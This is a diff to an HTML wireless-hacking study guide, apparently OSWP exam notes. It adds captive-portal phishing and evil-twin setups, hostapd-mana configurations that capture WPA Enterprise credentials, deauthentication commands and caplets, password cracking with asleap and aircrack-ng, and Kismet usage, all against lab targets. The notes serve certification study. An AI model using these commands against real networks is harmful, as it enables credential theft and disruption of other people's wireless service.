@@ -89,7 +89,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">12.</strong> Chapter 10 - Links</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CaptivePortal.html"><strong aria-hidden="true">8.1.</strong> Captive Portals</a></li></ol></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="bettercap.html"><strong aria-hidden="true">12.</strong> Chapter 10 - bettercap</a></li><li class="chapter-item expanded "><a href="kismet.html"><strong aria-hidden="true">13.</strong> Chapter 11 - Kismet</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">14.</strong> Chapter 12 - Links</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -185,6 +185,11 @@
 <p><img src="WiFi-Hacking-MindMap-v1.png" alt="OSWPMindMap" /></p>
 <p>-Brandon</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-0---roadmap"><a class="header" href="#chapter-0---roadmap">Chapter 0 - Roadmap</a></h1>
+<h2 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h2>
+<pre><code>sudo lsusb -vv
+lsusb
+sudo airmon-ng
+</code></pre>
 <h2 id="exam-roadmap"><a class="header" href="#exam-roadmap">Exam Roadmap</a></h2>
 <pre><code>ssh &lt;username&gt;@&lt;target_ip&gt; -p&lt;port&gt;                        ## connecting to the target system with SSH information provided by @offsec
 iw dev wlan0 scan | grep SSID                              ## wireless networks within the range of the wireless card (wlan0) are detected
@@ -610,7 +615,7 @@ If there are no connected clients try a dictionary attack, trying to connect to 
 <p>wigle.net -&gt; geographical location of BSSIDs</p>
 <p>Some phones randomize their MAC until the moment they connect to a network, when they switch to the good one. If we setup a honeypot we can get their real MAC if they connect to us</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-2---aircrack"><a class="header" href="#chapter-2---aircrack">Chapter 2 - Aircrack</a></h1>
-<h2 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h2>
+<h2 id="quick-notes-1"><a class="header" href="#quick-notes-1">Quick Notes</a></h2>
 <pre><code># Notes
 
 &gt; wlan0   ## network interface where the wireless network card
@@ -1024,7 +1029,7 @@ http://www.cotse.com/tools/wordlists1.htm
 http://www.cotse.com/tools/wordlists2.htm
 http://wordlist.sourceforge.net/</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-5---wep"><a class="header" href="#chapter-5---wep">Chapter 5 - WEP</a></h1>
-<h2 id="quick-notes-1"><a class="header" href="#quick-notes-1">Quick Notes</a></h2>
+<h2 id="quick-notes-2"><a class="header" href="#quick-notes-2">Quick Notes</a></h2>
 <pre><code>
 ## Fake Authentication Attack
    
@@ -1206,7 +1211,7 @@ airodump-ng -c 1 mon0 --write Hirte
 <div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-6---wpa"><a class="header" href="#chapter-6---wpa">Chapter 6 - WPA</a></h1>
 <h2 id="wpawpa2-1"><a class="header" href="#wpawpa2-1">WPA/WPA2</a></h2>
 <p>https://www.youtube.com/watch?v=Ra0dGPYScLQ</p>
-<h2 id="quick-notes-2"><a class="header" href="#quick-notes-2">Quick Notes</a></h2>
+<h2 id="quick-notes-3"><a class="header" href="#quick-notes-3">Quick Notes</a></h2>
 <pre><code>
 ## Cracking with Aircrack-ng
 
@@ -1348,7 +1353,207 @@ aircrack-ng -r &lt;output db&gt; &lt;file.cap&gt;
 <li>To enable 802.11w, we would set <em>ieee80211w</em> as a new parameter with the value of "1" (indicating it is optional).</li>
 <li>The latter also requires that we add "WPA-PSK-SHA256" to <em>wpa_key_mgmt</em>.</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="discovery"><a class="header" href="#discovery">Discovery</a></h2>
+<pre><code>sudo airodump-ng -w discovery --output-format pcap wlan0mon
+
+sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
+
+</code></pre>
+<h2 id="build"><a class="header" href="#build">Build</a></h2>
+<pre><code>sudo apt install apache2 libapache2-mod-php
+
+wget -r -l2 https://www.megacorpone.com
+
+- Let's create our captive portal login page, called index.php in /var/www/html/portal
+
+sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
+sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
+
+</code></pre>
+<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
+<pre><code>sudo ip addr add 192.168.87.1/24 dev wlan0
+sudo ip link set wlan0 up
+
+sudo apt install dnsmasq
+
+* setup mco-dnsmasq.conf*
+
+sudo dnsmasq --conf-file=mco-dnsmasq.conf
+
+sudo tail /var/log/syslog | grep dnsmasq
+
+sudo netstat -lnp
+
+sudo apt install nftables
+sudo nft add table ip nat
+sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
+sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
+
+*In Apache's site configuration, we need to add mod_rewrite7 and mod_alias7:1 rules so that the captive portal is set properly. We'll add the following lines in /etc/apache2/sites-enabled/000-default.conf before the VirtualHost closing tag.*
+
+sudo a2enmod rewrite
+sudo a2enmod alias
+
+sudo a2enmod ssl
+sudo systemctl restart apache2
+
+</code></pre>
+<h2 id="attack-run"><a class="header" href="#attack-run">Attack Run</a></h2>
+<pre><code>sudo hostapd -B mco-hostapd.conf
+
+sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
+
+sudo tail -f /var/log/apache2/access.log
+
+sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
+
+
+
+
+
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-7---wpa-enterprise"><a class="header" href="#chapter-7---wpa-enterprise">Chapter 7 - WPA Enterprise</a></h1>
+<h2 id="my-notes"><a class="header" href="#my-notes">My Notes</a></h2>
+<h2 id="certificates"><a class="header" href="#certificates">Certificates</a></h2>
+<pre><code>sudo airodump-ng wlan0mon
+
+We have to open the capture file with _Wireshark_ and locate the server certificate frame.  
+
+tls.handshake.certificate
+
+which will show the exact frames where the certificate is given.
+
+--------
+
+1) In the **Packet Details** pane 
+2) open _Extensible Authentication Protocol
+3) _Transport Layer Security_
+4) Open the **TLSv1 Record Layer: Handshake Protocol: Certificate** 
+5) Expand **Handshake Protocol: Certificate** item
+6) then **Certificates** (plural). 
+7) Inside **Certificates**, we see one or more entries named **Certificate**
+8) For each certificate, we right click and select _Export Packet Bytes_ to save the data into a file with a .der extension.
+9) openssl x509 -inform der -in CERTIFICATE_FILENAME -text 
+	1) where **CERTIFICATE_FILENAME** is the path to the certificate.
+10) We can convert it to PEM format using 
+	1) openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt
+
+
+
+</code></pre>
+<h2 id="attack"><a class="header" href="#attack">Attack</a></h2>
+<pre><code>
+sudo apt install freeradius
+
+sudo -s
+cd /etc/freeradius/3.0/certs
+nano ca.cnf
+
+...
+[certificate_authority]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = ca@playtronics.com
+commonName              = "Playtronics Certificate Authority"
+...
+
+nano server.cnf
+
+...
+[server]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = admin@playtronics.com
+commonName              = "Playtronics"
+...
+
+rm dh
+make
+
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+
+...
+# SSID of the AP
+ssid=Playtronics
+
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan0
+driver=nl80211
+
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+
+...
+
+We'll now need to create the EAP user file referenced in the configuration file:
+
+/etc/hostapd-mana/mana.eap_user
+
+The file should contain the following:
+...
+
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+...
+
+</code></pre>
+<h2 id="crack-password"><a class="header" href="#crack-password">Crack Password</a></h2>
+<pre><code>asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+
+
+
+</code></pre>
+<hr />
+<h2 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h2>
 <h3 id="wpa-enterprise-2"><a class="header" href="#wpa-enterprise-2">WPA enterprise</a></h3>
 <p>Each user uses his own user and password (if client certificates are not used). Each user's traffic is encrypted with a different key. Connection in windows:</p>
 <p>Looks like a captive portal but it's safer. In WPA enterprise we attack the clients, not the AP nor the RADIUS</p>
@@ -1376,7 +1581,7 @@ TTLS is a wrapper around TLVs (type length values), which are RADIUS attributes<
 <p>Similarly to EAP-TTLS, Protected Extensible Authentication Protocol (PEAP) also creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method.</p>
 <p>PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.</p>
 <p>PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hashcat</p>
-<h3 id="attack"><a class="header" href="#attack">Attack</a></h3>
+<h3 id="attack-1"><a class="header" href="#attack-1">Attack</a></h3>
 <p>The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.</p>
 <h3 id="optional-imitating-the-server-certificates"><a class="header" href="#optional-imitating-the-server-certificates">Optional: imitating the server certificates</a></h3>
 <p>While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.</p>
@@ -1564,6 +1769,48 @@ bssid_blacklist=&lt;hostapd-mana MAC&gt;
 <h3 id="eap-md5-crack"><a class="header" href="#eap-md5-crack">EAP MD5 crack</a></h3>
 <p><code>./eapmd5pass -w dict -r eapmd5-sample.dump</code></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-8---rogue-ap"><a class="header" href="#chapter-8---rogue-ap">Chapter 8 - Rogue AP</a></h1>
+<h2 id="my-notes-1"><a class="header" href="#my-notes-1">My Notes</a></h2>
+<h2 id="discovery-1"><a class="header" href="#discovery-1">Discovery</a></h2>
+<pre><code>sudo airodump-ng -w discovery --output-format pcap wlan0mon
+
+To get more information, let's open the output Pcap in Wireshark by running wireshark discovery-01.cap.
+
+To find the beacon for the target AP, we can use a filter to limit the types of packets displayed. First, we can display only beacon packets by using the filter:
+
+1) wlan.fc.type_subtype == 0x08. 
+	1) Management frames use "0" as the type and beacon frames are set to "8" as the subtype. 
+2) We can also only target the Mostar SSID by:
+	1) adding &amp;&amp; 
+	2) and using the filter wlan.ssid == "Mostar".
+</code></pre>
+<h2 id="attack-2"><a class="header" href="#attack-2">Attack</a></h2>
+<pre><code>
+cat Mostar-mana.conf
+
+interface=wlan0
+ssid=Mostar
+channel=1
+hw_mode=g
+ieee80211n=1
+wpa=3
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD
+wpa_pairwise=TKIP CCMP
+rsn_pairwise=TKIP CCMP
+mana_wpaout=/home/kali/mostar.hccapx
+
+sudo hostapd-mana Mostar-mana.conf
+
+
+sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
+
+aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+
+
+
+</code></pre>
+<hr />
+<h2 id="other-notes-1"><a class="header" href="#other-notes-1">Other Notes</a></h2>
 <h2 id="creating-a-rogue-ap"><a class="header" href="#creating-a-rogue-ap">Creating a Rogue AP</a></h2>
 <p>Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.</p>
 <p>If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.</p>
@@ -1746,7 +1993,218 @@ tshark -nr b64.pcap -2 -R "ssl.handshake.certificate" -T json -V
 <ul>
 <li>To transfer a capture file you can transfer it via scp, or encode it to base64 ( <code> base64 wpa-eap-tls.pcap</code> ) , copy the base64 displayed in screen (careful with large files, could result in data loss if the terminal doesn't contain many buffer lines) to a local file and decode it locally ( <code> cat b64.txt | base64 -d &gt; b64.pcap</code> )</li>
 </ul>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-10---helpful-links"><a class="header" href="#chapter-10---helpful-links">Chapter 10 - Helpful Links</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-10---bettercap"><a class="header" href="#chapter-10---bettercap">Chapter 10 - bettercap</a></h1>
+<h2 id="start"><a class="header" href="#start">Start</a></h2>
+<pre><code>sudo apt install bettercap
+
+sudo bettercap -iface wlan0
+
+</code></pre>
+<h2 id="discover"><a class="header" href="#discover">Discover</a></h2>
+<pre><code>wifi.recon on
+
+wifi.recon.channel 6,11
+
+set ticker.commands "clear; wifi.show"
+
+wifi.recon on
+
+ticker on  
+
+</code></pre>
+<h2 id="show-clients"><a class="header" href="#show-clients">Show Clients</a></h2>
+<pre><code>wifi.recon c6:2d:56:2a:53:f8
+
+wifi.show
+
+set wifi.show.filter ^c0
+
+wifi.show
+
+set wifi.show.filter ""
+
+set wifi.rssi.min -49
+
+wifi.show
+
+</code></pre>
+<h2 id="deauth-a-client"><a class="header" href="#deauth-a-client">DeAuth a client</a></h2>
+<pre><code>wifi.deauth c6:2d:56:2a:53:f8
+
+wifi.deauth ac:22:0b:28:fd:22
+
+wifi.recon off
+
+get wifi.handshakes.file
+
+set wifi.handshakes.file "/home/kali/handshakes/"
+
+set wifi.handshakes.aggregate false
+
+wifi.recon on
+
+wifi.deauth c6:2d:56:2a:53:f8
+
+wifi.deauth AA:BB:CC:DD:EE:FF
+
+set wifi.deauth.skip ac:22:0b:28:fd:22
+
+wifi.deauth c6:2d:56:2a:53:f8
+
+</code></pre>
+<h2 id="caplets"><a class="header" href="#caplets">Caplets</a></h2>
+<pre><code>cd /usr/share/bettercap/caplets/
+
+cat -n massdeauth.cap
+
+...
+ 1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+ 2
+ 3  # every 10 seconds deauth every client from every ap
+ 4  set ticker.period 10
+ 5  set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
+ 6
+ 7  # uncomment to only hop on these channels:
+ 8  # wifi.recon.channel 1,2,3
+ 9
+10  wifi.recon on
+11  ticker on
+12  events.clear
+13  clear
+...
+
+cat -n deauth_corp.cap
+
+...
+ 1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
+ 2
+ 3  set ticker.period 10
+ 4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
+ 5
+ 6  events.ignore wifi.ap.new
+ 7  events.ignore wifi.client.probe
+ 8  events.ignore wifi.client.new
+ 9
+10  wifi.recon on
+11  ticker on
+12  events.clear
+13  clear
+...
+
+
+sudo bettercap -iface wlan0 -caplet deauth_corp.cap
+
+</code></pre>
+<h2 id="web-interface"><a class="header" href="#web-interface">Web Interface</a></h2>
+<pre><code>sudo nft add table inet filter
+
+sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
+
+sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept
+
+sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept
+
+cat -n /usr/share/bettercap/caplets/https-ui.cap
+
+...
+ 1	# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0
+ 2	set api.rest.address 0.0.0.0
+ 3	set api.rest.port 8083
+ 4	set https.server.address 0.0.0.0
+ 5	set https.server.port 443
+ 6
+ 7	# make sure both use the same https certificate so api requests won't fail
+ 8	set https.server.certificate ~/.bettercap-https.cert.pem
+ 9	set https.server.key ~/.bettercap-https.key.pem
+10	set api.rest.certificate ~/.bettercap-https.cert.pem
+11	set api.rest.key ~/.bettercap-https.key.pem
+12	# default installation path of the ui
+13	set https.server.path /usr/share/bettercap/ui
+14
+15	# !!! CHANGE THESE !!!
+16	set api.rest.username offsec
+17	set api.rest.password wifu
+18
+19	# go!
+20	api.rest on
+21	https.server on
+...
+
+
+sudo bettercap -iface wlan0 -caplet https-ui
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-11---kismet"><a class="header" href="#chapter-11---kismet">Chapter 11 - Kismet</a></h1>
+<h2 id="setup-1"><a class="header" href="#setup-1">Setup</a></h2>
+<pre><code>sudo apt install kismet
+
+ls -al /etc/kismet/
+
+sudo mkdir /var/log/kismet
+
+</code></pre>
+<h2 id="start-1"><a class="header" href="#start-1">Start</a></h2>
+<pre><code>cd ~
+sudo kismet -c wlan0 --no-ncurses
+KISMET - Point your browser to http://localhost:2501 (or the address of this system) 
+
+^C
+
+ls -al /var/log/kismet/
+
+sudo kismet -c wlan0:channels="4,5,6"
+^C
+
+sudo kismet --daemonize
+
+
+</code></pre>
+<h2 id="remote-capture"><a class="header" href="#remote-capture">Remote Capture</a></h2>
+<pre><code>sudo kismet
+
+ssh kali@192.168.62.192 -L 8000:localhost:3501
+
+sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --source=wlan0
+
+sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --source=wlan0
+^C
+
+
+ssh kali@192.168.62.192 -L 8000:localhost:3501
+exit
+
+^C
+
+</code></pre>
+<h2 id="log-files"><a class="header" href="#log-files">Log Files</a></h2>
+<pre><code>sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet
+.tables
+.schema devices
+
+
+.headers on
+select type, devmac from devices;
+
+.quit
+
+sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
+
+
+sudo kismet -c Documents/Network_Join_Nokia_Mobile.pcap:realtime=true
+^C
+
+</code></pre>
+<h2 id="exporting-data"><a class="header" href="#exporting-data">Exporting Data</a></h2>
+<pre><code>kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources
+
+kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose
+
+
+kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose
+
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-12---helpful-links"><a class="header" href="#chapter-12---helpful-links">Chapter 12 - Helpful Links</a></h1>
 <ul>
 <li>
 <p><a href="https://wifichallengelab.com/">WiFi Challenge</a></p>
@@ -1775,6 +2233,9 @@ tshark -nr b64.pcap -2 -R "ssl.handshake.certificate" -T json -V
 <li>
 <p><a href="https://github.com/blunderbuss-wctf/wacker">Wacker Tool</a></p>
 </li>
+<li>
+<p><a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">Report Builder Tool</a></p>
+</li>
 </ul>
 
                     </main>
@@ -1794,6 +2255,22 @@ tshark -nr b64.pcap -2 -R "ssl.handshake.certificate" -T json -V
 
         </div>
 
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
 
 
 
